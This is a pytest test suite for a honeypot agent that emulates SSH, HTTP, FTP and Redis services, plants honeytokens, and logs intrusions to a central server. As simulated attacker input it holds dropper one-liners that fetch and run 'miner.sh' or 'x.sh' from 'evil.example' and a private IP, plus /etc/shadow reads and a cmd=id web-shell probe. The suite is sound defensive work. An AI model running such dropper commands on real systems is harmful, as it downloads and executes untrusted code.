import asyncio
import json
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import asyncssh

from netsvc.buffer import EventBuffer
from netsvc.center import CenterClient
from netsvc.core import Agent
from netsvc.emitter import Emitter
from netsvc.traps.banner import BannerTrap
from netsvc.traps.http import HttpTrap
from netsvc.traps.ssh import SshTrap


def run(coro):
    return asyncio.run(coro)


def types(buf):
    return [e["type"] for e in buf.peek(100)]


def test_buffer_persists_across_restart_and_dedupes(tmp_path):
    path = str(tmp_path / "q.db")
    b = EventBuffer(path)
    b.add({"uid": "a1", "type": "connect"})
    b.add({"uid": "a1", "type": "connect"})  # тот же uid
    b.add({"uid": "a2", "type": "connect"})
    assert EventBuffer(path).count() == 2     # «перезапуск» агента
    b.delete(["a1"])
    assert [e["uid"] for e in b.peek(10)] == ["a2"]


def test_emitter_truncates_and_can_drop_passwords():
    async def go():
        buf = EventBuffer(":memory:")
        em = Emitter(buf, capture_passwords=False)
        em.emit("auth_attempt", username="u" * 1000, password="secret")
        ev = buf.peek(1)[0]
        assert len(ev["username"]) == 128 and ev["password"] == ""
    run(go())


def test_banner_trap_records_connect_and_payload():
    async def go():
        buf = EventBuffer(":memory:")
        trap = BannerTrap({"port": 0, "banner": "220 FTP ready"}, {"logging": {"max_payload_bytes": 64}}, Emitter(buf))
        await trap.start("127.0.0.1")
        r, w = await asyncio.open_connection("127.0.0.1", trap.port)
        assert (await r.readline()).strip() == b"220 FTP ready"
        w.write(b"USER anonymous\r\n")
        await w.drain()
        w.close()
        await asyncio.sleep(0.3)
        await trap.stop()
        evs = buf.peek(10)
        assert [e["type"] for e in evs] == ["connect", "payload"]
        assert "USER anonymous" in evs[1]["command"] and evs[0]["src_ip"] == "127.0.0.1"
    run(go())


async def http(port, raw: bytes) -> bytes:
    r, w = await asyncio.open_connection("127.0.0.1", port)
    w.write(raw)
    await w.drain()
    data = await asyncio.wait_for(r.read(65536), 5)
    w.close()
    return data


def test_http_trap_login_capture_404_and_honeytoken():
    async def go():
        buf = EventBuffer(":memory:")
        cfg = {"decoys": {"users": [{"username": "admin", "password": "admin123"}],
                          "honeytokens": [{"type": "url", "path": "/backup.sql", "content": "-- dump"}]}}
        trap = HttpTrap({"port": 0, "banner": "Apache/2.4.41 (Ubuntu)"}, cfg, Emitter(buf))
        await trap.start("127.0.0.1")
        page = await http(trap.port, b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
        assert b"Admin Console" in page and b"Server: Apache/2.4.41" in page
        assert b"404" in (await http(trap.port, b"GET /nope HTTP/1.1\r\nHost: x\r\n\r\n"))
        body = b"username=root&password=toor"
        bad = await http(trap.port, b"POST /login HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\n\r\n" % len(body) + body)
        assert b"Invalid username" in bad
        good_body = b"username=admin&password=admin123"
        good = await http(trap.port, b"POST /login HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\n\r\n" % len(good_body) + good_body)
        assert b"302" in good
        assert b"-- dump" in (await http(trap.port, b"GET /backup.sql HTTP/1.1\r\nHost: x\r\n\r\n"))
        await trap.stop()
        evs = buf.peek(50)
        auth = [e for e in evs if e["type"] == "auth_attempt"]
        assert [(a["username"], a["password"]) for a in auth] == [("root", "toor"), ("admin", "admin123")]
        assert any(e["type"] == "honeytoken" and e["command"] == "/backup.sql" for e in evs)
    run(go())


def test_http_trap_survives_garbage():
    async def go():
        buf = EventBuffer(":memory:")
        trap = HttpTrap({"port": 0}, {}, Emitter(buf))
        await trap.start("127.0.0.1")
        await http(trap.port, b"\x16\x03\x01\x00\xa5\x01\x00\x00\xa1\r\n\r\n")           # TLS ClientHello в открытый порт
        await http(trap.port, b"POST / HTTP/1.1\r\nContent-Length: 99999999\r\n\r\n")     # гигантское тело
        assert b"Admin Console" in await http(trap.port, b"GET / HTTP/1.1\r\n\r\n")        # сервер жив
        await trap.stop()
    run(go())


def test_ssh_trap_captures_credentials_commands_honeytoken(tmp_path):
    async def go():
        buf = EventBuffer(":memory:")
        cfg = {"decoys": {"hostname": "db-prod-01", "accept_any_password": True,
                          "honeytokens": [{"type": "file", "path": "/root/.aws/credentials", "content": "AKIAFAKE\n"}]}}
        trap = SshTrap({"port": 0, "banner": "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5"}, cfg, Emitter(buf), str(tmp_path))
        await trap.start("127.0.0.1")
        async with asyncssh.connect("127.0.0.1", trap.port, username="root", password="hunter2", known_hosts=None) as conn:
            assert "OpenSSH_8.2p1" in conn.get_extra_info("server_version")
            res = await conn.run("cat /root/.aws/credentials")
            assert "AKIAFAKE" in res.stdout
            res = await conn.run("uname -a")
            assert "db-prod-01" in res.stdout
            res = await conn.run("nosuchcmd")
            assert "command not found" in res.stdout
        await asyncio.sleep(0.3)
        await trap.stop()
        evs = buf.peek(50)
        assert ("root", "hunter2") in [(e["username"], e["password"]) for e in evs if e["type"] == "auth_attempt"]
        assert [e["command"] for e in evs if e["type"] == "command"][:1] == ["cat /root/.aws/credentials"]
        assert any(e["type"] == "honeytoken" and e["command"] == "/root/.aws/credentials" for e in evs)
        assert "session_end" in types(buf) and len({e["session_id"] for e in evs if e["session_id"]}) == 1
        # стабильный отпечаток: ключ хоста сохранён и переиспользуется
        again = SshTrap({"port": 0}, cfg, Emitter(buf), str(tmp_path))
        assert again._host_key().export_public_key() == trap._host_key().export_public_key()
    run(go())


def test_ssh_trap_rejects_wrong_password_when_strict(tmp_path):
    async def go():
        buf = EventBuffer(":memory:")
        cfg = {"decoys": {"accept_any_password": False, "users": [{"username": "root", "password": "toor"}]}}
        trap = SshTrap({"port": 0}, cfg, Emitter(buf), str(tmp_path))
        await trap.start("127.0.0.1")
        try:
            await asyncssh.connect("127.0.0.1", trap.port, username="root", password="nope", known_hosts=None,
                                   preferred_auth="password")
            raise AssertionError("вход не должен был пройти")
        except asyncssh.PermissionDenied:
            pass
        async with asyncssh.connect("127.0.0.1", trap.port, username="root", password="toor", known_hosts=None):
            pass
        await trap.stop()
        assert [e["password"] for e in buf.peek(50) if e["type"] == "auth_attempt"][:2] == ["nope", "toor"]
    run(go())


# --- связь с центром: буфер и дослылка ---
class FakeCenter:
    """Минимальный центр: можно «выключить» ответы и посмотреть, что дошло."""

    def __init__(self):
        self.up = True
        self.received: list[dict] = []
        center = self

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def _json(self, code, obj):
                data = json.dumps(obj).encode()
                self.send_response(code)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def do_GET(self):
                if not center.up or self.headers.get("Authorization") != "Bearer hf_ok":
                    return self._json(503 if not center.up else 404, {})
                resp_data = {"rev": "r1", "state": "run", "poll": 1, "cmds": [], "config": {
                    "level": "low", "services": [{"port": 0, "proto": "banner", "banner": "hello"}], "masking": {"jitter": 0}}}
                if "enc" in self.headers.get("Accept-Encoding-Custom", ""):
                    from netsvc.crypto import derive_payload_key, encrypt_payload
                    resp_data = encrypt_payload(resp_data, derive_payload_key("hf_ok"))
                self._json(200, resp_data)

            def do_POST(self):
                body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
                if not center.up:
                    return self._json(503, {})
                if "enc" in body:
                    from netsvc.crypto import decrypt_payload, derive_payload_key
                    body = decrypt_payload(body, derive_payload_key("hf_ok"))
                center.received += body["events"]
                self._json(200, {"ok": len(body["events"]), "dup": 0})

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    @property
    def url(self):
        return f"http://127.0.0.1:{self.server.server_port}"

    def close(self):
        self.server.shutdown()


def test_crypto_e2e_encryption_and_tamper_detection():
    from netsvc.crypto import decrypt_payload, derive_payload_key, encrypt_payload
    from cryptography.exceptions import InvalidTag
    import base64

    token = "secret_trap_token_123"
    key = derive_payload_key(token)
    data = {"events": [{"type": "auth_attempt", "command": "malware.sh", "src_ip": "1.2.3.4"}]}

    envelope = encrypt_payload(data, key)
    assert envelope["v"] == 2
    assert "enc" in envelope
    assert "nonce" in envelope
    assert "events" not in envelope  # Payload is completely masked

    # Decrypt with correct key
    decrypted = decrypt_payload(envelope, key)
    assert decrypted == data

    # Tampering test (simulate attacker modifying 1 byte in transit)
    raw_ct = bytearray(base64.b64decode(envelope["enc"]))
    raw_ct[0] ^= 0xFF
    tampered_envelope = {**envelope, "enc": base64.b64encode(raw_ct).decode("ascii")}

    try:
        decrypt_payload(tampered_envelope, key)
        assert False, "Tampered payload should have failed authentication"
    except InvalidTag:
        pass  # Expected: integrity check succeeded in detecting tamper


def test_agent_buffers_while_center_down_and_flushes_after(tmp_path):
    center = FakeCenter()
    center.up = False

    async def go():
        buf = EventBuffer(str(tmp_path / "q.db"))
        agent = Agent(CenterClient(center.url, "hf_ok", timeout=2), buf, str(tmp_path), bind_host="127.0.0.1")
        runner = asyncio.create_task(agent.run())
        t_start = time.time()
        for i in range(3):
            agent.emitter.emit("connect", src_ip=f"10.0.0.{i}")
        t_end = time.time()
        await asyncio.sleep(1.5)
        assert buf.count() == 3 and not center.received  # центр недоступен: события в буфере, не потеряны
        center.up = True
        for _ in range(100):
            if len(center.received) >= 3:
                break
            await asyncio.sleep(0.2)
        agent.shutdown()
        await runner
        assert {e["src_ip"] for e in center.received} == {"10.0.0.0", "10.0.0.1", "10.0.0.2"}
        # Проверяем FR-A4: ts остаётся временем самого события, а не временем досылки (до задержки в 1.5 с)
        for e in center.received:
            assert t_start <= e["ts"] <= t_end
        assert buf.count() == 0
    try:
        run(go())
    finally:
        center.close()


def test_agent_starts_traps_from_manifest(tmp_path):
    center = FakeCenter()

    async def go():
        buf = EventBuffer(str(tmp_path / "q.db"))
        agent = Agent(CenterClient(center.url, "hf_ok", timeout=2), buf, str(tmp_path), bind_host="127.0.0.1")
        runner = asyncio.create_task(agent.run())
        for _ in range(50):
            if agent.traps:
                break
            await asyncio.sleep(0.1)
        assert agent.traps, "ловушка не запустилась по манифесту"
        r, w = await asyncio.open_connection("127.0.0.1", agent.traps[0].port)
        assert (await r.readline()).strip() == b"hello"
        w.close()
        for _ in range(60):
            if center.received:
                break
            await asyncio.sleep(0.1)
        agent.shutdown()
        await runner
        assert center.received and center.received[0]["type"] == "connect"
    try:
        run(go())
    finally:
        center.close()


def test_client_falls_back_to_plain_channel_without_cryptography(monkeypatch):
    from netsvc import center

    monkeypatch.setattr(center, "derive_payload_key", None)
    c = center.CenterClient("http://x", "hf_token")
    assert c.key is None and c.encrypt is False
def test_low_trap_interactive_redis_and_ftp():
    async def go():
        buf = EventBuffer(":memory:")
        trap = BannerTrap({"port": 0, "banner": "redis_version:6.0.9"}, {"logging": {"max_payload_bytes": 128}}, Emitter(buf))
        await trap.start("127.0.0.1")
        r, w = await asyncio.open_connection("127.0.0.1", trap.port)
        w.write(b"PING\r\n")
        await w.drain()
        assert (await r.readline()).strip() == b"+PONG"
        w.write(b"AUTH mysecretpwd\r\n")
        await w.drain()
        assert (await r.readline()).strip() == b"+OK"
        w.write(b"QUIT\r\n")
        await w.drain()
        assert (await r.readline()).strip() == b"+OK"
        w.close()
        await asyncio.sleep(0.2)
        await trap.stop()
        evs = buf.peek(20)
        assert any(e["type"] == "auth_attempt" and e["password"] == "mysecretpwd" for e in evs)

        # FTP interaction
        buf2 = EventBuffer(":memory:")
        ftp_trap = BannerTrap({"port": 0, "banner": "220 ProFTPD"}, {"logging": {"max_payload_bytes": 128}}, Emitter(buf2))
        await ftp_trap.start("127.0.0.1")
        r2, w2 = await asyncio.open_connection("127.0.0.1", ftp_trap.port)
        assert b"220 ProFTPD" in (await r2.readline())
        w2.write(b"USER admin\r\n")
        await w2.drain()
        assert b"331" in (await r2.readline())
        w2.write(b"PASS myftppass\r\n")
        await w2.drain()
        assert b"530" in (await r2.readline())
        w2.close()
        await asyncio.sleep(0.2)
        await ftp_trap.stop()
        evs2 = buf2.peek(20)
        assert any(e["type"] == "auth_attempt" and e["username"] == "admin" and e["password"] == "myftppass" for e in evs2)
    run(go())


def test_ssh_trap_chained_commands_and_recon(tmp_path):
    async def go():
        buf = EventBuffer(":memory:")
        cfg = {"decoys": {"hostname": "db-server", "accept_any_password": True}}
        trap = SshTrap({"port": 0}, cfg, Emitter(buf), str(tmp_path))
        await trap.start("127.0.0.1")
        async with asyncssh.connect("127.0.0.1", trap.port, username="root", password="pwd", known_hosts=None) as conn:
            # 1. Chained commands execution
            res = await conn.run("cd /tmp && pwd; whoami")
            assert "/tmp" in res.stdout and "root" in res.stdout

            # 2. System reconnaissance
            res = await conn.run("lscpu; nproc; free -m; which wget")
            assert "x86_64" in res.stdout
            assert "2" in res.stdout
            assert "Mem:" in res.stdout
            assert "/bin/wget" in res.stdout

            # 3. Honeytoken /etc/shadow
            res = await conn.run("cat /etc/shadow")
            assert "root:$6$" in res.stdout

            # 4. Dropper & execution emulation
            res = await conn.run("cd /tmp && wget http://10.0.0.99/miner.sh && chmod +x miner.sh && ./miner.sh")
            assert "saved" in res.stdout

        await asyncio.sleep(0.3)
        await trap.stop()
        evs = buf.peek(50)
        assert any(e["type"] == "honeytoken" and "/etc/shadow" in e["command"] for e in evs)
        assert any(e["type"] == "payload" and e.get("data", {}).get("kind") == "download-attempt" for e in evs)
        assert any(e["type"] == "payload" and e.get("data", {}).get("kind") == "execution-attempt" for e in evs)
    run(go())


def test_http_trap_builtin_honeytokens_and_probes():
    async def go():
        buf = EventBuffer(":memory:")
        trap = HttpTrap({"port": 0}, {}, Emitter(buf))
        await trap.start("127.0.0.1")

        # 1. Automatic .env honeytoken
        env_res = await http(trap.port, b"GET /.env HTTP/1.1\r\nHost: target\r\n\r\n")
        assert b"DB_PASSWORD=" in env_res and b"AWS_ACCESS_KEY_ID=" in env_res

        # 2. Automatic .git/config honeytoken
        git_res = await http(trap.port, b"GET /.git/config HTTP/1.1\r\nHost: target\r\n\r\n")
        assert b"repositoryformatversion" in git_res

        # 3. Robots.txt
        robots_res = await http(trap.port, b"GET /robots.txt HTTP/1.1\r\nHost: target\r\n\r\n")
        assert b"Disallow: /.env" in robots_res

        # 4. Web attack probe detection
        probe_res = await http(trap.port, b"GET /index.php?cmd=id HTTP/1.1\r\nHost: target\r\n\r\n")
        assert b"404 Not Found" in probe_res

        await trap.stop()
        evs = buf.peek(30)
        assert any(e["type"] == "honeytoken" and e["command"] == "/.env" for e in evs)
        assert any(e["type"] == "honeytoken" and e["command"] == "/.git/config" for e in evs)
        assert any(e["type"] == "payload" and e.get("data", {}).get("kind") == "web-attack-probe" for e in evs)

    run(go())


# --- поддельная оболочка ---
def make_shell(user="root", tty=False):
    from netsvc.traps import shell as sh
    sh.NET_DELAY = (0, 0)
    fs = sh.FakeFS("web-prod-01", [{"type": "file", "path": "/root/.aws/credentials", "content": "AKIAFAKE\n"}],
                   'PRETTY_NAME="Ubuntu 22.04.4 LTS"\nVERSION_ID="22.04"\n')
    events = []
    uname = "Linux {hostname} 5.15.0-122-generic #132-Ubuntu SMP Thu Aug 29 13:45:52 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux"
    return sh.Shell(fs, user, "web-prod-01", fs.files["/etc/os-release"], uname, 0, "10.20.0.15", [(22, "ssh"), (80, "http")],
                    "1.2.3.4", lambda kind, **kw: events.append((kind, kw)), tty=tty), events


def sh_run(shell, line):
    return run(shell.run_line(line))[0]


def test_shell_chains_pipes_quotes_and_variables():
    shell, _ = make_shell()
    assert sh_run(shell, "id; hostname") == "uid=0(root) gid=0(root) groups=0(root)\nweb-prod-01\n"
    assert sh_run(shell, "false && echo no || echo yes") == "yes\n"
    assert sh_run(shell, "echo 'a  b' \"c $USER\"") == "a  b c root\n"
    assert sh_run(shell, "cat /etc/passwd | grep www | wc -l") == "1\n"
    assert sh_run(shell, "echo $(hostname)-x `whoami`") == "web-prod-01-x root\n"
    assert sh_run(shell, "X=5; echo $X ${X}") == "5 5\n"
    assert sh_run(shell, "echo aGk= | base64 -d") == "hi"
    assert sh_run(shell, "echo $(echo id) | sh") == "uid=0(root) gid=0(root) groups=0(root)\n"
    assert sh_run(shell, "echo 'unclosed").startswith("bash: unexpected EOF")


def test_shell_filesystem_state_redirects_and_permissions():
    shell, events = make_shell()
    assert sh_run(shell, "mkdir /tmp/x && cd /tmp/x && echo hello > f.txt && cat f.txt && ls") == "hello\nf.txt\n"
    assert sh_run(shell, "ls /tmp/x /nonexist").endswith("ls: cannot access '/nonexist': No such file or directory\n")
    assert sh_run(shell, "echo a >> f.txt; wc -l < f.txt") == "2\n"
    assert sh_run(shell, "rm -rf /tmp/x; ls /tmp") == ""
    assert sh_run(shell, "cat /root/.aws/credentials") == "AKIAFAKE\n"
    assert any(k == "honeytoken" for k, _ in events)
    wrote = [kw["data"] for k, kw in events if k == "payload" and kw["data"].get("kind") == "write"]
    assert wrote and wrote[0]["sha256"] == __import__("hashlib").sha256(b"hello\n").hexdigest() and wrote[0]["size"] == 6
    user, _ = make_shell("admin")
    assert sh_run(user, "cat /etc/shadow") == "cat: /etc/shadow: Permission denied\n"
    assert "root:" in sh_run(user, "sudo cat /etc/shadow")
    assert sh_run(user, "pwd") == "/home/admin\n" and user.prompt() == "admin@web-prod-01:~$ "
    assert sh_run(user, "cd /var/www && pwd") == "/var/www\n"


def test_shell_system_info_is_consistent_and_downloads_logged():
    shell, events = make_shell()
    assert sh_run(shell, "uname -r") == "5.15.0-122-generic\n"
    assert "22.04" in sh_run(shell, "lsb_release -a") and "Ubuntu 22.04.4 LTS" in sh_run(shell, "cat /etc/os-release")
    assert ":80 " in sh_run(shell, "ss -tlnp") and "apache2" in sh_run(shell, "ps aux")
    assert "systemd-journal-helper" not in sh_run(shell, "ps aux; ps -ef")
    out = sh_run(shell, "cd /tmp && wget http://evil.example/x.sh && chmod +x x.sh && ./x.sh && ls")
    assert "saved [" in out and out.endswith("x.sh\n")
    assert any(k == "payload" and "evil.example" in kw["command"] for k, kw in events)
    assert any(k == "payload" and kw["data"]["kind"] == "execution-attempt" for k, kw in events)
    assert sh_run(shell, "cd /tmp && touch y && ./y") == "bash: ./y: Permission denied\n"
    assert sh_run(shell, "nosuch --flag") == "bash: nosuch: command not found\n"
    assert sh_run(shell, "exit") == "" and not shell.alive


def test_http_trap_apache_style_errors_and_head():
    async def go():
        trap = HttpTrap({"port": 0}, {}, Emitter(EventBuffer(":memory:")))
        await trap.start("127.0.0.1")
        miss = (await http(trap.port, b"GET /nope HTTP/1.1\r\nHost: shop.example.com\r\nConnection: close\r\n\r\n")).decode()
        assert "Date: " in miss and "Apache/2.4.41 (Ubuntu) Server at shop.example.com Port" in miss
        assert b"403 Forbidden" in await http(trap.port, b"GET /server-status HTTP/1.1\r\nHost: a\r\n\r\n")
        assert b"501 Not Implemented" in await http(trap.port, b"FOO / HTTP/1.1\r\nHost: a\r\n\r\n")
        head = await http(trap.port, b"HEAD / HTTP/1.1\r\nHost: a\r\n\r\n")
        assert head.startswith(b"HTTP/1.1 200") and b"<form" not in head
        await trap.stop()
    run(go())


def test_sftp_upload_is_captured_hashed_and_removed(tmp_path):
    import base64
    import hashlib

    async def go():
        buf = EventBuffer(":memory:")
        trap = SshTrap({"port": 0}, {"decoys": {"hostname": "web-1"}}, Emitter(buf), str(tmp_path))
        await trap.start("127.0.0.1")
        src = tmp_path / "payload.sh"
        src.write_bytes(b"#!/bin/sh\necho hi\n")
        async with asyncssh.connect("127.0.0.1", trap.port, username="root", password="x", known_hosts=None) as conn:
            async with conn.start_sftp_client() as sftp:
                await sftp.put(str(src), "/tmp/up.sh")
        await asyncio.sleep(0.3)
        await trap.stop()
        ups = [e for e in buf.peek(50) if e["type"] == "payload" and e["data"].get("kind") == "upload"]
        assert len(ups) == 1
        d = ups[0]["data"]
        assert d["sha256"] == hashlib.sha256(src.read_bytes()).hexdigest() and d["size"] == 18
        assert base64.b64decode(d["content_b64"]) == src.read_bytes()
        assert "/tmp/up.sh" in trap.fs.files
        assert not [p for p in tmp_path.iterdir() if p.name.startswith("sftp-")]  # временная папка убрана
    run(go())
